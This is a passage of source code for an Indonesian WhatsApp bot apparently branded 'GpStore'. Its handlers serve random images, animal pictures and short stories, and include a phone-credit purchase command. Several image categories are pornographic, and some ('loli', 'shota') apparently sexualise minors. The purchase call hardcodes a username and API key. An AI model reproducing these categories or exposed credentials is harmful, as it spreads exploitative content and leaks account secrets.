if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cosplaysagiri.json')
if (/cuckold/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cuckold.json')
if (/cum/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cum.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cyber.json')
if (/darkjokes/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/darkjokes.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/emilia.json')
if (/ero/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/ero.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/femdom.json')
if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/foot.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/gamewallpaper.json')
if (/gangbang/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/gangbang.json')
if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/gifs.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/gremory.json')
if (/hekel/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/hekel.json')
if (/hentai/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/hentai.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/hestia.json')
if (/hijaber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/hijaber.json')
if (/hinata/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/hinata.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/itori.json')
if (/jahy/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/jahy.json')
if (/jeni/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kaori.json')
if (/kartun/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kartun.json')
if (/katakata/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/madara.json')
if (/masturbation/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/masturbation.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/miku.json')
if (/milf/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/milf.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/minato.json')
if (/mobil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/onepiece.json')
if (/orgy/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/orgy.json')
if (/panties/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/panties.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/pubg.json')
if (/pussy/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/pussy.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/shota.json')
if (/tatasurya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/tejina.json')
if (/tentacles/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/tentacles.json')
if (/thighs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/thighs.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)];
let buttoons = [
{buttonId: `${prefix+command}`, buttonText: {displayText: 'Next'}, type: 1}
]
let buttonMessaage = {
image: { url: yeha }, 
jpegThumbnail: ppnyaimg,
caption: `Nih Kak @${sender.split("@")[0]}`,
fileLength: "999999999999",
mentions: [sender],
footer: `Powered By GpStore`,
buttons: buttoons,
headerType: 4,
contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hai Kak ${pushname}`, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": { url: yeha },
"mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
"sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
}}
}
GpStore.sendMessage(m.chat, buttonMessaage, { quoted: m })
}
break
case 'fox':  
case 'dog':  
case 'cat':
case 'panda':  
case 'birb': 
case 'koala': 
if (!isPrem) return replyprem(mess.premium)
neys = await fetchJson(`https://some-random-api.ml/img/${command}`)
anu1 = await getBuffer(neys.link)
GpStore.sendMessage(m.chat, { image: anu1, caption: `${mess.succes}` }, { quoted : m })
break
case 'jjmeryani':{
if (!isPrem) return replyprem(mess.premium)
let kaydt = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/meryani.json')
let hayu = kaydt[Math.floor(Math.random() * kaydt.length)];
GpStore.sendMessage(m.chat,{video:{url:hayu},caption:`${mess.succes}`},{quoted: m})
}
break
case 'cerpen_anak':{
if (!isPrem) return replyprem(mess.premium)
let cerpe = await cerpen(`anak`)
reply(`�? _*Title :*_ ${cerpe.title}\n�? _*Author :*_ ${cerpe.author}\n�? _*Category :*_ ${cerpe.kategori}\n�? _*Pass Moderation :*_ ${cerpe.lolos}\n�? _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen_bahasadaerah':{
if (!isPrem) return replyprem(mess.premium)
let cerpet = await cerpen(`bahasa daerah`)
reply(`�? _*Title :*_ ${cerpet.title}\n�? _*Author :*_ ${cerpet.author}\n�? _*Category :*_ ${cerpet.kategori}\n�? _*Pass Moderation :*_ ${cerpet.lolos}\n�? _*Story :*_\n${cerpet.cerita}`)
}
break
case 'cerpen_bahasainggris':{
if (!isPrem) return replyprem(mess.premium)
let cerpez = await cerpen(`bahasa Inggris`)
reply(`�? _*Title :*_ ${cerpez.title}\n�? _*Author :*_ ${cerpez.author}\n�? _*Category :*_ ${cerpez.kategori}\n�? _*Pass Moderation :*_ ${cerpez.lolos}\n�? _*Story :*_\n${cerpez.cerita}`)
}
break
case 'cerpen_bahasajawa':{
if (!isPrem) return replyprem(mess.premium)
let cerpep = await cerpen(`bahasa jawa`)
reply(`�? _*Title :*_ ${cerpep.title}\n�? _*Author :*_ ${cerpep.author}\n�? _*Category :*_ ${cerpep.kategori}\n�? _*Pass Moderation :*_ ${cerpep.lolos}\n�? _*Story :*_\n${cerpep.cerita}`)
}
break
case 'cerpen_bahasasunda':{
if (!isPrem) return replyprem(mess.premium)
let cerped = await cerpen(`bahasa sunda`)
reply(`�? _*Title :*_ ${cerped.title}\n�? _*Author :*_ ${cerped.author}\n�? _*Category :*_ ${cerped.kategori}\n�? _*Pass Moderation :*_ ${cerped.lolos}\n�? _*Story :*_\n${cerped.cerita}`)
}
break
case 'cerpen_budaya':{
if (!isPrem) return replyprem(mess.premium)
let cerper = await cerpen(`budaya`)
reply(`�? _*Title :*_ ${cerper.title}\n�? _*Author :*_ ${cerper.author}\n�? _*Category :*_ ${cerper.kategori}\n�? _*Pass Moderation :*_ ${cerper.lolos}\n�? _*Story :*_\n${cerper.cerita}`)
}
break
case 'cerpen_cinta':{
if (!isPrem) return replyprem(mess.premium)
let cerpem = await cerpen(`cinta`)
reply(`�? _*Title :*_ ${cerpem.title}\n�? _*Author :*_ ${cerpem.author}\n�? _*Category :*_ ${cerpem.kategori}\n�? _*Pass Moderation :*_ ${cerpem.lolos}\n�? _*Story :*_\n${cerpem.cerita}`)
}
break
case 'cerpen_cintaislami':{
if (!isPrem) return replyprem(mess.premium)
let cerpel = await cerpen(`cinta islami`)
reply(`�? _*Title :*_ ${cerpel.title}\n�? _*Author :*_ ${cerpel.author}\n�? _*Category :*_ ${cerpel.kategori}\n�? _*Pass Moderation :*_ ${cerpel.lolos}\n�? _*Story :*_\n${cerpel.cerita}`)
}
break
case 'cerpen_cintapertama':{
if (!isPrem) return replyprem(mess.premium)
let cerpes = await cerpen(`cinta pertama`)
reply(`�? _*Title :*_ ${cerpes.title}\n�? _*Author :*_ ${cerpes.author}\n�? _*Category :*_ ${cerpes.kategori}\n�? _*Pass Moderation :*_ ${cerpes.lolos}\n�? _*Story :*_\n${cerpes.cerita}`)
}
break
case 'buypulsa':{
let dokid = text.split("|")[0]
let cusid = text.split("|")[1]
if (isNaN(parseInt(cusid))) return reply('Nomor Hp Harus Berupa Angka!')

let anuni = await fetchJson(`https://trendtoday.my.id/api/transaction?username=manik729828YWOD&apikey=lq7ae3b7j6n0wgrz5arcqdh0c5o7cx&product=pulsa&nominal=${dokid}&id_costumer=${cusid}`)
let suksess = `*─ 「 LANJUTKAN PEMBAYARAN 」 ─*
                
_Silahkan Scan Qris Dan Transfer Sesuai Harga:_
_》Harga : Rp${anuni.amount}_
_》Provider : ${anuni.provider}_
_》Nomor : ${cusid} ( Pulsa )_
_》Code Trx : ${anuni.transaction_id}_

_Qr Scan Berlaku 5 Menit, Setelah 5 Menit Pesan Ini Akan Dihapus!._  

_Note: Pulsa Akan Otomatis Masuk Setelah Pembayaran Berhasil._`
let inina = await Manik.sendMessage(m.chat, { image: { url: anuni.qr_payment }, caption: `${suksess}` }, { quoted: m })
setTimeout(() => {
Manik.sendMessage(from, { delete:inina.key })
}, 500000)
}
break    
case 'cerpen_cintaromantis':{
if (!isPrem) return replyprem(mess.premium)
let cerpde = await cerpen(`cinta romantis`)
reply(`�? _*Title :*_ ${cerpde.title}\n�? _*Author :*_ ${cerpde.author}\n�? _*Category :*_ ${cerpde.kategori}\n�? _*Pass Moderation :*_ ${cerpde.lolos}\n�? _*Story :*_\n${cerpde.cerita}`)
}
break
case 'cerpen_cintasedih':{
if (!isPrem) return replyprem(mess.premium)
let fejdj = await cerpen(`cinta sedih`)
reply(`�? _*Title :*_ ${fejdj.title}\n�? _*Author :*_ ${fejdj.author}\n�? _*Category :*_ ${fejdj.kategori}\n�? _*Pass Moderation :*_ ${fejdj.lolos}\n�? _*Story :*_\n${fejdj.cerita}`)
}
break
case 'cerpen_cintasegitiga':{
if (!isPrem) return replyprem(mess.premium)
let frofk = await cerpen(`Cinta segitiga`)
reply(`�? _*Title :*_ ${frofk.title}\n�? _*Author :*_ ${frofk.author}\n�? _*Category :*_ ${frofk.kategori}\n�? _*Pass Moderation :*_ ${frofk.lolos}\n�? _*Story :*_\n${frofk.cerita}`)
}
break
case 'cerpen_cintasejati':{
if (!isPrem) return replyprem(mess.premium)
let frljkek = await cerpen(`cinta sejati`)
reply(`�? _*Title :*_ ${frljkek.title}\n�? _*Author :*_ ${frljkek.author}\n�? _*Category :*_ ${frljkek.kategori}\n�? _*Pass Moderation :*_ ${frljkek.lolos}\n�? _*Story :*_\n${frljkek.cerita}`)
}
break
case 'cerpen_galau':{
if (!isPrem) return replyprem(mess.premium)
let cdjfj = await cerpen(`galau`)
reply(`�? _*Title :*_ ${cdjfj.title}\n�? _*Author :*_ ${cdjfj.author}\n�? _*Category :*_ ${cdjfj.kategori}\n�? _*Pass Moderation :*_ ${cdjfj.lolos}\n�? _*Story :*_\n${cdjfj.cerita}`)
}
break
case 'cerpen_gokil':{
if (!isPrem) return replyprem(mess.premium)
let vrkfjf = await cerpen(`gokil`)
reply(`�? _*Title :*_ ${vrkfjf.title}\n�? _*Author :*_ ${vrkfjf.author}\n�? _*Category :*_ ${vrkfjf.kategori}\n�? _*Pass Moderation :*_ ${vrkfjf.lolos}\n�? _*Story :*_\n${vrkfjf.cerita}`)
}
break
case 'cerpen_inspiratif':{
if (!isPrem) return replyprem(mess.premium)
let ngkgk = await cerpen(`inspiratif`)
reply(`�? _*Title :*_ ${ngkgk.title}\n�? _*Author :*_ ${ngkgk.author}\n�? _*Category :*_ ${ngkgk.kategori}\n�? _*Pass Moderation :*_ ${ngkgk.lolos}\n�? _*Story :*_\n${ngkgk.cerita}`)
}
break
case 'cerpen_jepang':{
if (!isPrem) return replyprem(mess.premium)
let vrlgk = await cerpen(`jepang`)
reply(`�? _*Title :*_ ${vrlgk.title}\n�? _*Author :*_ ${vrlgk.author}\n�? _*Category :*_ ${vrlgk.kategori}\n�? _*Pass Moderation :*_ ${vrlgk.lolos}\n�? _*Story :*_\n${vrlgk.cerita}`)
}
break
case 'cerpen_kehidupan':{
if (!isPrem) return replyprem(mess.premium)
let ntlgkt = await cerpen(`kehidupan`)
reply(`�? _*Title :*_ ${ntlgkt.title}\n�? _*Author :*_ ${ntlgkt.author}\n�? _*Category :*_ ${ntlgkt.kategori}\n�? _*Pass Moderation :*_ ${ntlgkt.lolos}\n�? _*Story :*_\n${ntlgkt.cerita}`)
}
break
case 'cerpen_keluarga':{
if (!isPrem) return replyprem(mess.premium)
let bmflg = await cerpen(`keluarga`)
reply(`�? _*Title :*_ ${bmflg.title}\n�? _*Author :*_ ${bmflg.author}\n�? _*Category :*_ ${bmflg.kategori}\n�? _*Pass Moderation :*_ ${bmflg.lolos}\n�? _*Story :*_\n${bmflg.cerita}`)
}
break
case 'cerpen_kisahnyata':{
if (!isPrem) return replyprem(mess.premium)
let yptoo = await cerpen(`kisah nyata`)
reply(`�? _*Title :*_ ${yptoo.title}\n�? _*Author :*_ ${yptoo.author}\n�? _*Category :*_ ${yptoo.kategori}\n�? _*Pass Moderation :*_ ${yptoo.lolos}\n�? _*Story :*_\n${yptoo.cerita}`)
}
break
case 'cerpen_korea':{
if (!isPrem) return replyprem(mess.premium)
let jptpgr = await cerpen(`korea`)
reply(`�? _*Title :*_ ${jptpgr.title}\n�? _*Author :*_ ${jptpgr.author}\n�? _*Category :*_ ${jptpgr.kategori}\n�? _*Pass Moderation :*_ ${jptpgr.lolos}\n�? _*Story :*_\n${jptpgr.cerita}`)
}
break
case 'cerpen_GpStoreten':{
if (!isPrem) return replyprem(mess.premium)
let yesusanjing = await cerpen(`GpStoreten`)
reply(`�? _*Title :*_ ${yesusanjing.title}\n�? _*Author :*_ ${yesusanjing.author}\n�? _*Category :*_ ${yesusanjing.kategori}\n�? _*Pass Moderation :*_ ${yesusanjing.lolos}\n�? _*Story :*_\n${yesusanjing.cerita}`)
}
break
case 'cerpen_liburan':{
if (!isPrem) return replyprem(mess.premium)
let frkfkrk = await cerpen(`liburan`)
reply(`�? _*Title :*_ ${frkfkrk.title}\n�? _*Author :*_ ${frkfkrk.author}\n�? _*Category :*_ ${frkfkrk.kategori}\n�? _*Pass Moderation :*_ ${frkfkrk.lolos}\n�? _*Story :*_\n${frkfkrk.cerita}`)
}
break
case 'cerpen_malaysia':{
if (!isPrem) return replyprem(mess.premium)
let mzbdjd = await cerpen(`malaysia`)
reply(`�? _*Title :*_ ${mzbdjd.title}\n�? _*Author :*_ ${mzbdjd.author}\n�? _*Category :*_ ${mzbdjd.kategori}\n�? _*Pass Moderation :*_ ${mzbdjd.lolos}\n�? _*Story :*_\n${mzbdjd.cerita}`)
}
break
case 'cerpen_mengharukan':{
if (!isPrem) return replyprem(mess.premium)
let bgfngk = await cerpen(`mengharukan`)
reply(`�? _*Title :*_ ${bgfngk.title}\n�? _*Author :*_ ${bgfngk.author}\n�? _*Category :*_ ${bgfngk.kategori}\n�? _*Pass Moderation :*_ ${bgfngk.lolos}\n�? _*Story :*_\n${bgfngk.cerita}`)
}
break
case 'cerpen_misteri':{
if (!isPrem) return replyprem(mess.premium)
let lapdoek = await cerpen(`misteri`)
reply(`�? _*Title :*_ ${lapdoek.title}\n�? _*Author :*_ ${lapdoek.author}\n�? _*Category :*_ ${lapdoek.kategori}\n�? _*Pass Moderation :*_ ${lapdoek.lolos}\n�? _*Story :*_\n${lapdoek.cerita}`)
}
break
case 'cerpen_motivasi':{
if (!isPrem) return replyprem(mess.premium)
let bltkyj = await cerpen(`motivasi`)
reply(`�? _*Title :*_ ${bltkyj.title}\n�? _*Author :*_ ${bltkyj.author}\n�? _*Category :*_ ${bltkyj.kategori}\n�? _*Pass Moderation :*_ ${bltkyj.lolos}\n�? _*Story :*_\n${bltkyj.cerita}`)
}
break
case 'cerpen_nasihat':{
if (!isPrem) return replyprem(mess.premium)
let qpeidek = await cerpen(`nasihat`)
reply(`�? _*Title :*_ ${qpeidek.title}\n�? _*Author :*_ ${qpeidek.author}\n�? _*Category :*_ ${qpeidek.kategori}\n�? _*Pass Moderation :*_ ${qpeidek.lolos}\n�? _*Story :*_\n${qpeidek.cerita}`)
}
break
case 'cerpen_nasionalisme':{
if (!isPrem) return replyprem(mess.premium)
let cdmrgo = await cerpen(`nasionalisme`)
reply(`�? _*Title :*_ ${cdmrgo.title}\n�? _*Author :*_ ${cdmrgo.author}\n�? _*Category :*_ ${cdmrgo.kategori}\n�? _*Pass Moderation :*_ ${cdmrgo.lolos}\n�? _*Story :*_\n${cdmrgo.cerita}`)
}
break
case 'cerpen_olahraga':{
if (!isPrem) return replyprem(mess.premium)
let qpdiek = await cerpen(`olahraga`)
reply(`�? _*Title :*_ ${qpdiek.title}\n�? _*Author :*_ ${qpdiek.author}\n�? _*Category :*_ ${qpdiek.kategori}\n�? _*Pass Moderation :*_ ${qpdiek.lolos}\n�? _*Story :*_\n${qpdiek.cerita}`)
}
break
case 'cerpen_patahhati':{
if (!isPrem) return replyprem(mess.premium)
let vrlfor = await cerpen(`patah hati`)
reply(`�? _*Title :*_ ${vrlfor.title}\n�? _*Author :*_ ${vrlfor.author}\n�? _*Category :*_ ${vrlfor.kategori}\n�? _*Pass Moderation :*_ ${vrlfor.lolos}\n�? _*Story :*_\n${vrlfor.cerita}`)
}
break
case 'cerpen_penantian':{
if (!isPrem) return replyprem(mess.premium)
let aldpek = await cerpen(`penantian`)
reply(`�? _*Title :*_ ${aldpek.title}\n�? _*Author :*_ ${aldpek.author}\n�? _*Category :*_ ${aldpek.kategori}\n�? _*Pass Moderation :*_ ${aldpek.lolos}\n�? _*Story :*_\n${aldpek.cerita}`)
}
break
case 'cerpen_pendidikan':{
if (!isPrem) return replyprem(mess.premium)
let xnrjrk = await cerpen(`pendidikan`)
reply(`�? _*Title :*_ ${xnrjrk.title}\n�? _*Author :*_ ${xnrjrk.author}\n�? _*Category :*_ ${xnrjrk.kategori}\n�? _*Pass Moderation :*_ ${xnrjrk.lolos}\n�? _*Story :*_\n${xnrjrk.cerita}`)
}
break
case 'cerpen_pengalaman':{
if (!isPrem) return replyprem(mess.premium)
let hrkgor = await cerpen(`pengalaman pribadi`)
reply(`�? _*Title :*_ ${hrkgor.title}\n�? _*Author :*_ ${hrkgor.author}\n�? _*Category :*_ ${hrkgor.kategori}\n�? _*Pass Moderation :*_ ${hrkgor.lolos}\n�? _*Story :*_\n${hrkgor.cerita}`)
}
break
case 'cerpen_pengorbanan':{
if (!isPrem) return replyprem(mess.premium)
let itklog = await cerpen(`pengorbanan`)
reply(`�? _*Title :*_ ${itklog.title}\n�? _*Author :*_ ${itklog.author}\n�? _*Category :*_ ${itklog.kategori}\n�? _*Pass Moderation :*_ ${itklog.lolos}\n�? _*Story :*_\n${itklog.cerita}`)
}
break
case 'cerpen_penyesalan':{
if (!isPrem) return replyprem(mess.premium)
let pgrjgo = await cerpen(`penyesalan`)
reply(`�? _*Title :*_ ${pgrjgo.title}\n�? _*Author :*_ ${pgrjgo.author}\n�? _*Category :*_ ${pgrjgo.kategori}\n�? _*Pass Moderation :*_ ${pgrjgo.lolos}\n�? _*Story :*_\n${pgrjgo.cerita}`)
}
break
case 'cerpen_perjuangan':{
if (!isPrem) return replyprem(mess.premium)
let vtlgotk = await cerpen(`perjuangan`)
reply(`�? _*Title :*_ ${vtlgotk.title}\n�? _*Author :*_ ${vtlgotk.author}\n�? _*Category :*_ ${vtlgotk.kategori}\n�? _*Pass Moderation :*_ ${vtlgotk.lolos}\n�? _*Story :*_\n${vtlgotk.cerita}`)
}
break
case 'cerpen_perpisahan':{
if (!isPrem) return replyprem(mess.premium)
let wpfuej = await cerpen(`perpisahan`)
reply(`�? _*Title :*_ ${wpfuej.title}\n�? _*Author :*_ ${wpfuej.author}\n�? _*Category :*_ ${wpfuej.kategori}\n�? _*Pass Moderation :*_ ${wpfuej.lolos}\n�? _*Story :*_\n${wpfuej.cerita}`)
}
break
case 'cerpen_persahabatan':{
if (!isPrem) return replyprem(mess.premium)
let jptoyk = await cerpen(`persahabatan`)
